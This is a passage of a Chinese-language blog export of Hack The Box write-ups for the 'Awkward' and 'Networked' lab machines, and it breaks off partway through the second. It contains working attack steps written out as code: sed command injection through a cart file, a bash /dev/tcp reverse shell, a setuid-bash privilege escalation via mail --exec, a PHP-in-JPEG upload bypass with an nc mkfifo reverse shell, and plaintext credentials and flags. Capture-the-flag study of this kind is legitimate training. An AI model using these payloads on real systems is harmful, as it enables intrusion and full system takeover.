checkwinsize\n\n# If set, the pattern \"**\" used in a pathname expansion context will\n# match all files and zero or more directories and subdirectories.\n#shopt -s globstar\n\n# make less more friendly for non-text input files, see lesspipe(1)\n[ -x /usr/bin/lesspipe ] && eval \"$(SHELL=/bin/sh lesspipe)\"\n\n# set variable identifying the chroot you work in (used in the prompt below)\nif [ -z \"${debian_chroot:-}\" ] && [ -r /etc/debian_chroot ]; then\n    debian_chroot=$(cat /etc/debian_chroot)\nfi\n\n# set a fancy prompt (non-color, unless we know we \"want\" color)\ncase \"$TERM\" in\n    xterm-color|*-256color) color_prompt=yes;;\nesac\n\n# uncomment for a colored prompt, if the terminal has the capability; turned\n# off by default to not distract the user: the focus in a terminal window\n# should be on the output of commands, not on the prompt\n#force_color_prompt=yes\n\nif [ -n \"$force_color_prompt\" ]; then\n    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then\n        # We have color support; assume it's compliant with Ecma-48\n        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such\n        # a case would tend to support setf rather than setaf.)\n        color_prompt=yes\n    else\n        color_prompt=\n    fi\nfi\n\nif [ \"$color_prompt\" = yes ]; then\n    PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\nelse\n    PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\nfi\nunset color_prompt force_color_prompt\n\n# If this is an xterm set the title to user@host:dir\ncase \"$TERM\" in\nxterm*|rxvt*)\n    PS1=\"\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1\"\n    ;;\n*)\n    ;;\nesac\n\n# enable color support of ls and also add handy aliases\nif [ -x /usr/bin/dircolors ]; then\n    test -r ~/.dircolors && eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\"\n    alias ls='ls --color=auto'\n    #alias dir='dir --color=auto'\n    #alias vdir='vdir --color=auto'\n\n    alias grep='grep --color=auto'\n    alias fgrep='fgrep --color=auto'\n    alias egrep='egrep --color=auto'\nfi\n\n# colored GCC warnings and errors\n#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'\n\n# some more ls aliases\nalias ll='ls -alF'\nalias la='ls -A'\nalias l='ls -CF'\n\n# custom\nalias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'\n\n# Add an \"alert\" alias for long running commands.  Use like so:\n#   sleep 10; alert\nalias alert='notify-send --urgency=low -i \"$([ $? = 0 ] && echo terminal || echo error)\" \"$(history|tail -n1|sed -e '\\''s/^\\s*[0-9]\\+\\s*//;s/[;&|]\\s*alert$//'\\'')\"'\n\n# Alias definitions.\n# You may want to put all your additions into a separate file like\n# ~/.bash_aliases, instead of adding them here directly.\n# See /usr/share/doc/bash-doc/examples in the bash-doc package.\n\nif [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\n\n# enable programmable completion features (you don't need to enable\n# this, if it's already enabled in /etc/bash.bashrc and /etc/profile\n# sources /etc/bash.bashrc).\nif ! shopt -oq posix; then\n  if [ -f /usr/share/bash-completion/bash_completion ]; then\n    . /usr/share/bash-completion/bash_completion\n  elif [ -f /etc/bash_completion ]; then\n    . /etc/bash_completion\n  fi\nfi\n```\n```bash\n# custom\nalias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'\n```\næˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ª aliasï¼Œè¿˜æœ‰ä¸€ä¸ª hash è„šæœ¬ `/home/bean/Documents/backup_home.sh` \n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0\n\ncurl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0\"\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# curl http://hat-valley.htb/api/all-leave --header \"cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzg1NTE0NTd9.nlTiW6mox1VXEHkf4fc_dX_pJqqtW8Srm58MNRTeSe0\"\n#!/bin/bash\nmkdir /home/bean/Documents/backup_tmp\ncd /home/bean\ntar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .\ndate > /home/bean/Documents/backup_tmp/time.txt\ncd /home/bean/Documents/backup_tmp\ntar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .\nrm -r /home/bean/Documents/backup_tmp\n```\næˆ‘ä»¬å»ä¸‹è½½è¿™ä¸ªæ–‡ä»¶\n\n```bash\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw\n\ncurl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw\" --output bean_backup_final.zip\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/bean]\nâ””â”€# curl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY2NzAxNzE1N30.0Rf75JtUz77mGO61T_NVG7_34fAJ_JckobQUBfbPeUw\" --output bean_backup_final.zip\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 31716  100 31716    0     0  61542      0 --:--:-- --:--:-- --:--:-- 61584\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/bean]\nâ””â”€# ls\nbean_backup_final.zip\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/bean]\nâ””â”€# unzip bean_backup_final.zip \nArchive:  bean_backup_final.zip\n  End-of-central-directory signature not found.  Either this file is not\n  a zipfile, or it constitutes one disk of a multi-part archive.  In the\n  latter case the central directory and zipfile comment will be found on\n  the last disk(s) of this archive.\nunzip:  cannot find zipfile directory in one of bean_backup_final.zip or\n        bean_backup_final.zip.zip, and cannot find bean_backup_final.zip.ZIP, period.\n```\nå°†æ–‡ä»¶è§£å‹å‡ºæ¥\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/bean]\nâ””â”€# ls -la\næ€»è®¡ 68\ndrwxr-xr-x  6 root     root      4096  3æœˆ12æ—¥ 01:26 .\ndrwxr-xr-x  3 root     root      4096  3æœˆ12æ—¥ 01:17 ..\nlrwxrwxrwx  1 lucifiel lucifiel     9  9æœˆ15æ—¥ 19:40 .bash_history -> /dev/null\n-rw-r--r--  1 lucifiel lucifiel   220  9æœˆ15æ—¥ 19:34 .bash_logout\n-rw-r--r--  1 lucifiel lucifiel  3847  9æœˆ15æ—¥ 19:45 .bashrc\n-rw-r--r--  1 root     root     31716  3æœˆ12æ—¥ 01:26 bean_backup_final.zip\ndrwxr-xr-x 12 root     root      4096  3æœˆ12æ—¥ 01:24 .config\ndrwxr-xr-x  2 root     root      4096  3æœˆ12æ—¥ 01:24 .gnupg\ndrwxr-xr-x  3 root     root      4096  3æœˆ12æ—¥ 01:24 .local\n-rw-r--r--  1 lucifiel lucifiel   807  9æœˆ15æ—¥ 19:34 .profile\ndrwx------  2 lucifiel lucifiel  4096  9æœˆ15æ—¥ 19:36 .ssh\n```\nè¿™æ˜¯è§£å‹å‡ºæ¥çš„æ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/bean/.config/xpad]\nâ””â”€# cat content-DS1ZS1 \nTO DO:\n- Get real hat prices / stock from Christine\n- Implement more secure hashing mechanism for HR system\n- Setup better confirmation message when adding item to cart\n- Add support for item quantity > 1\n- Implement checkout system\n\nî€€boldî€€HR SYSTEMî€€/boldî€€\nbean.hill\n014mrbeanrules!#P\n\nhttps://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html\n\nî€€boldî€€MAKE SURE TO USE THIS EVERYWHERE ^^^î€€/boldî€€ \n```\nåœ¨ bean/.config/xpad/content-DS1ZS1 ä¸­æ‰¾åˆ°äº† bean çš„å¯†ç \n\n```bash\nusername = bean.hill\npassword = 014mrbeanrules!#P\n```\nå°è¯•ä½¿ç”¨ bean å»ç™»å½• ssh\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh bean@10.10.11.185                      \nThe authenticity of host '10.10.11.185 (10.10.11.185)' can't be established.\nED25519 key fingerprint is SHA256:iXn1BLzsoL4oHP9bO/v5F/CKp7pdoku6nopTeJlvR3U.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.185' (ED25519) to the list of known hosts.\nbean@10.10.11.185's password: \nWelcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Mar 12 01:59:31 2023 from 10.10.14.68\nbean@awkward:~$ whoami&&id\nbean\nuid=1001(bean) gid=1001(bean) groups=1001(bean)\n```\næˆåŠŸç™»å½•åˆ° user ç”¨æˆ·\n\n```bash\nbean@awkward:~$ cat user.txt \n5005243124dea7c1f14fc7d933ef2946\n```\næˆåŠŸæ‹¿åˆ° user ç”¨æˆ·çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\nè¿˜è®°å¾—æˆ‘ä»¬çš„å­åŸŸå store å—ï¼Ÿ\n\nåœ¨ burp ä¸­çš„æ—¶å€™æ˜¾ç¤ºè¯¥é¡µé¢æ¥è‡ª nginx æœåŠ¡å™¨ï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ shell ä¸­çš„ nginx é…ç½®æ–‡ä»¶\n\n```bash\nbean@awkward:~$ cd /etc/nginx/conf.d/\nbean@awkward:/etc/nginx/conf.d$ ls -la\ntotal 12\ndrwxr-xr-x 2 root root 4096 Sep 15 22:34 .\ndrwxr-xr-x 8 root root 4096 Oct  6 00:49 ..\n-rw-r--r-- 1 root root   44 Sep 15 22:34 .htpasswd\nbean@awkward:/etc/nginx/conf.d$ cat .htpasswd \nadmin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1\n```\næˆ‘ä»¬ä½¿ç”¨ john å»è·‘ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash\nWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"\nUse the \"--format=md5crypt-long\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:01:30 DONE (2023-03-12 01:34) 0g/s 156319p/s 156319c/s 156319C/s  ejngyhga007..*7Â¡Vamos!\nSession completed.\n```\nç„¶è€Œå¹¶æ²¡æœ‰ç»“æœ\n\nç„¶è€Œæˆ‘çªç„¶æƒ³èµ·æ¥ content-DS1ZS1 æ–‡ä»¶åº•éƒ¨æœ‰ä¸€å¥æ³¨é‡Š\n\n```bash\nî€€boldî€€MAKE SURE TO USE THIS EVERYWHERE ^^^î€€/boldî€€ \n```\nå¤§æ¦‚æ„æ€å°±æ˜¯è®©æˆ‘ä»¬å¯¼å‡ºå°è¯•ä¸€ä¸‹\n\n```bash\nusername = admin\npassword = 014mrbeanrules!#P\n```\nä½¿ç”¨ bean çš„ä»£ç å‰å¾€ [http://store.hat-valley.htb/](http://store.hat-valley.htb/) ç™»å½• admin è´¦æˆ·æˆåŠŸ\n\n![](Hackthebox-Awkward/w4xE8GRniDaZ555NGGjxG7k93o5vOMK_xI-1wrM-xBE.png)\n\nè¿™å¾ˆæ˜æ˜¾æ˜¯ Hat Valley çš„åœ¨çº¿å•†åº—ã€‚æˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹ä»£ç \n\n```bash\nbean@awkward:/var/www/store$ ls -la\ntotal 104\ndrwxr-xr-x 9 root root  4096 Oct  6 01:35 .\ndrwxr-xr-x 7 root root  4096 Oct  6 01:35 ..\ndrwxrwxrwx 2 root root  4096 Mar 12 01:30 cart\n-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php\n-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php\n-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php\ndrwxr-xr-x 2 root root  4096 Oct  6 01:35 css\ndrwxr-xr-x 2 root root  4096 Oct  6 01:35 fonts\ndrwxr-xr-x 6 root root  4096 Oct  6 01:35 img\n-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php\ndrwxr-xr-x 3 root root  4096 Oct  6 01:35 js\ndrwxrwxrwx 2 root root  4096 Mar 12 04:30 product-details\n-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md\n-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php\ndrwxr-xr-x 6 root root  4096 Oct  6 01:35 static\n-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css\n```\n```bash\nbean@awkward:/var/www/store$ cat README.md \n# Hat Valley - Shop Online!\n\n### To Do\n1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup\n2. Implement checkout system, link with credit card system (Stripe??)\n3. Implement shop filter\n4. Get full catalogue of items\n\n### How to Add New Catalogue Item\n1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID\n2. Change the fields to the appropriate values and save the file.  \n-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --\n\n### Hat Valley Cart\nRight now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.\nTo test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!\n```\nREADME.md å‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶æ­£ç¦»çº¿å­˜å‚¨åœ¨ /product-details å’Œ /cart ä¸­\n\nåœ¨æ–‡ä»¶ cart\\_actions.php ä¸­çš„ä¸€æ®µä»£ç \n\n```bash\n    if(checkValidItem(\"{$STORE_HOME}cart/{$user_id}\")) {\n        system(\"sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}\");\n        echo \"Item removed from cart\";\n    }\n    else {\n        echo \"Invalid item\";\n    }\n    exit;\n```\nè¿™ä¸å°±æœ‰äº†\n\nè¿™æ®µä¸­çš„ sed å‘½ä»¤æ˜¯ç”¨äºä»è´­ç‰©è½¦æ–‡ä»¶ä¸­åˆ é™¤æ•°æ®\n\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªä»£ç æ¥è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œ\n\né¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ª Reverse Shell\n\n```bash\necho \"bash -i >& /dev/tcp/10.10.16.26/4444 0>&1\" >> /tmp/shell.sh\nchmod 777 /tmp/shell.sh\n\nbean@awkward:/var/www/store/cart$ cat /tmp/shell.sh \n#!/bin/bash\nbash -i >& /dev/tcp/10.10.16.26/4444 0>&1\n```\n```bash\nnc -nvlp 4444\n```\nç„¶åæ¥ç€æˆ‘ä»¬å°†äº§å“æ·»åŠ åˆ°è´­ç‰©è½¦\n\n![](Hackthebox-Awkward/KYqHRotuHTuY2rpPIxX8gqZRLC1495Wsi3qTqpLcWxs.png)\n\nç„¶åä¿®æ”¹ä¸€ä¸‹å‚æ•°ï¼ŒåŠ å…¥ä¸‹é¢çš„å‚æ•°\n\n```bash\n1/'+-e+\"1e+/tmp/shell.sh\"+/tmp/shell.sh+'\n```\nç„¶åæˆ‘ä»¬éœ€è¦ä¿®æ”¹åœ¨ /cart ä¸­åˆ›å»ºçš„æ–‡ä»¶ï¼Œä¸å¹¸çš„æ˜¯æˆ‘ä»¬æ²¡æœ‰æ“ä½œæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©åˆ é™¤è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åè‡ªå·±åˆ›å»ºä¸€ä¸ª\n\n```bash\nbean@awkward:/var/www/store/cart$ ls\nb1b9-7006-2d9-74bc\nbean@awkward:/var/www/store/cart$ cp b1b9-7006-2d9-74bc bak\nbean@awkward:/var/www/store/cart$ rm -rf b1b9-7006-2d9-74bc \nbean@awkward:/var/www/store/cart$ cp bak b1b9-7006-2d9-74bc\nbean@awkward:/var/www/store/cart$ vi b1b9-7006-2d9-74bc \nbean@awkward:/var/www/store/cart$ cat b1b9-7006-2d9-74bc \n***Hat Valley Cart***\nitem_id=1' -e \"1e /tmp/shell.sh\" /tmp/shell.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90\n```\nç„¶åæˆ‘ä»¬æŠ“ä¸€ä¸ªåˆ é™¤å•†å“çš„åŒ…\n\n![](Hackthebox-Awkward/3oUIuzXPTBfkS_5VW2BUWSPDKeieNH2Wtx79zXp1ouE.png)\n\n![](Hackthebox-Awkward/c2kb5YS27NqycwXtnWllo20DaFGqjJTSp7368GOkJ8Y.png)\n\nä¿®æ”¹å¥½ä»¥åæ‰§è¡Œ\n\nè¿™è¾¹æ‹¿åˆ°çš„æ˜¯ www-data çš„æƒé™\n\nå»æ‰§è¡Œä¸€ä¸‹ pspy\n\nå½“æœ‰æ–°çš„è¯·å‡è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨ mail å‘½ä»¤æ‹¼æ¥å¯¹åº” csv æ–‡ä»¶ä¸­çš„ name\n\n```bash\n2023/03/12 05:12:09 CMD: UID=0     PID=74503  | mail -s Leave Request: christopher.jones christine\n```\n```bash\nwww-data@awkward:/tmp$ cat exploit.sh\n#!/bin/bash\nchmod +s /bin/bash\n\nwww-data@awkward:/tmp$ chmod 777 exploit\n\nwww-data@awkward:/tmp$ cd /var/www/private\n\nwww-data@awkward:~/private$ echo '\" --exec=\"\\!/tmp/exploit.sh\"' >> leave_requests.csv\n<\" --exec=\"\\!/tmp/exploit.sh\"' >> leave_requests.csv\nwww-data@awkward:~/private$ ls -la /bin/bash\n\nls -la /bin/bash\n-rwsr-sr-x 1 root root 1396520 Jan  7  2022 /bin/bash\n```\n```bash\nwww-data@awkward:~/private$ /bin/bash -p\n/bin/bash -p\nwhoami&&id\nroot\nuid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\ncat /root/root.txt\n5d3d649dfbaf5f418cdca5f79012eafa\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Networked - Hackthebox","url":"/2023/03/06/Hackthebox/Easy/Hackthebox-Networked/","content":"\n# Hackthebox - Networked\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Networked/oBIU1gxoGcT7rKwveVIwwFp3AxJa4y_sbYfvQNrxIE8.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Networked/1zzbuFS-Q-N-9g9YwHuhjBtk9JEKz6A4S-36f86DeuA.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.146 \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 19:52 CST\nNmap scan report for 10.10.10.146\nHost is up (0.11s latency).\nNot shown: 65513 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited)\nPORT    STATE  SERVICE VERSION\n22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 2275d7a74f81a7af5266e52744b1015b (RSA)\n|   256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA)\n|_  256 73cda05b84107da71c7c611df554cfc4 (ED25519)\n80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)\n|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n443/tcp closed https\nAggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 5.1 (92%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 4.10 (90%), Linux 4.4 (90%), Linux 3.10 (90%), Linux 3.11 - 3.12 (90%), Linux 3.18 (90%), Linux 3.2 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   87.93 ms  10.10.16.1\n2   132.57 ms 10.10.10.146\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.97 seconds\n```\n## Http\n![](Hackthebox-Networked/7hLi1hKGhdeSNbzZRf4ozBzqTrwN3YTDFJU2BqMnEgI.png)\n\nä¼¼ä¹æ˜¯è¯´è¿™ä¸ªç½‘ç«™è¿˜åœ¨åšï¼Œæˆ‘ä»¬å»åšä¸ª fuzz çœ‹çœ‹\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.10.146/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.146/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\n                        [Status: 200, Size: 229, Words: 33, Lines: 9, Duration: 89ms]\nuploads                 [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 9426ms]\nbackup                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 88ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 2217 req/sec :: Duration: [0:00:22] :: Errors: 2 ::\n```\næœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œä¸€ä¸ª uploadsï¼Œä¸€ä¸ª backup\n\n![](Hackthebox-Networked/WnVZHga434P3n7tK6oeYlrwtQ17T_CP_-hJ7gatltUA.png)\n\næœ‰ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œä¸‹è½½åè§£å‹çœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/backup]\nâ””â”€# ls -la\næ€»è®¡ 36\ndrwxr-xr-x 2 root root  4096  2æœˆ26æ—¥ 00:52 .\ndrwxr-xr-x 3 root root  4096  2æœˆ26æ—¥ 00:51 ..\n-rw-r--r-- 1 root root 10240 2019å¹´ 7æœˆ 9æ—¥ backup.tar\n-rw-r--r-- 1 root root   229  2æœˆ26æ—¥ 00:52 index.php\n-rw-r--r-- 1 root root  2001  2æœˆ26æ—¥ 00:52 lib.php\n-rw-r--r-- 1 root root  1871  2æœˆ26æ—¥ 00:52 photos.php\n-rw-r--r-- 1 root root  1331  2æœˆ26æ—¥ 00:52 upload.php\n```\nè¿™è¾¹å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªæ–‡ä»¶ï¼Œå¤§æ¦‚çš„é€»è¾‘å¯ä»¥ç†æ¸…äº†\n\né€šè¿‡ upload ä¸Šä¼ æ–‡ä»¶ï¼Œé€šè¿‡ photos æŸ¥çœ‹å›¾ç‰‡\n\n```bash\n    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile[\"name\"];\n    list ($foo,$ext) = getnameUpload($myFile[\"name\"]);\n    $validext = array('.jpg', '.png', '.gif', '.jpeg');\n    $valid = false;\n    foreach ($validext as $vext) {\n      if (substr_compare($myFile[\"name\"], $vext, -strlen($vext)) === 0) {\n        $valid = true;\n```\né€šè¿‡å®¡è®¡ upload.php æ–‡ä»¶çš„ä»£ç ï¼Œå‘ç°æœ‰ç™½åå•é™åˆ¶ï¼Œåªèƒ½ä¸Šä¼  `.jpg` ã€`png` ã€`.gif` ã€`.jpeg` å››ä¸ªæ ¼å¼çš„æ–‡ä»¶\n\n# æ¼æ´åˆ©ç”¨\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/backup]\nâ””â”€# ls\n1.jpg  backup.tar  index.php  lib.php  photos.php  upload.php\n                                                                                                                                                                                                                   \nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/backup]\nâ””â”€# cat 2.php  \nphp -r '$sock=fsockopen(getenv(\"10.10.16.3\"),getenv(\"4444\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n```\nå‡†å¤‡ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ª php æ¥åˆ¶ä½œ shell\n\n```bash\necho '<?php' >> 1.jpg\necho 'passthru(\"whoami\");' >> 1.jpg\necho '?>' >> 1.jpg\nmv 1.jpg 1.php.jpg\n```\n![](Hackthebox-Networked/iuXWC5PuphfeCDYtW1g0VhFoYcT6VItUSdsgqkDzAyU.png)\n\næˆåŠŸä¸Šä¼ \n\n![](Hackthebox-Networked/L82sn7aAA4tcYa_tavcnntukULCt4arL7sadFib1cb0.png)\n\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶\n\n![](Hackthebox-Networked/Ksd4LTBvu4otPgud7vAfbOQbJalE2wsbxDO4GOEEBOA.png)\n\nç¡®å®è¢«æ‰§è¡Œäº†ï¼Œæƒé™æ˜¯ apacheï¼Œæˆ‘ä»¬å»åˆ¶ä½œä¸€ä¸‹åå¼¹çš„ shell\n\n```bash\nmv 1.jpg shell.php.jpg\necho '<?php' >> shell.php.jpg\necho 'passthru(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 4444 >/tmp/f\");' >> shell.php.jpg\necho '?>' >> shell.php.jpg\nnc -nvlp 4444\n```\nç„¶åå»ä¸Šä¼ \n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/backup]\nâ””â”€# rlwrap nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.3] from (UNKNOWN) [10.10.10.146] 59222\nsh: no job control in this shell\nsh-4.2$ whoami&&id\nwhoami&&id\napache\nuid=48(apache) gid=48(apache) groups=48(apache)\n```\næˆåŠŸæ‹¿åˆ° shell\n\n# æƒé™æå‡\n## User\n```bash\nsh-4.2$ ls -la\nls -la\ntotal 28\ndrwxr-xr-x. 2 guly guly 4096 Sep  6 15:57 .\ndrwxr-xr-x. 3 root root   18 Jul  2  2019 ..\nlrwxrwxrwx. 1 root root    9 Sep  7 13:05 .bash_history -> /dev/null\n-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout\n-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile\n-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc\n-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php\n-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly\n-r--------. 1 guly guly   33 Mar  6 12:51 user.txt\n```\nåœ¨ `/home` ä¸‹æœ‰ä¸€ä¸ªç”¨æˆ· `guly` \n\nç„¶ååœ¨ç”¨æˆ· `guly` ä¸­æœ‰å‡ 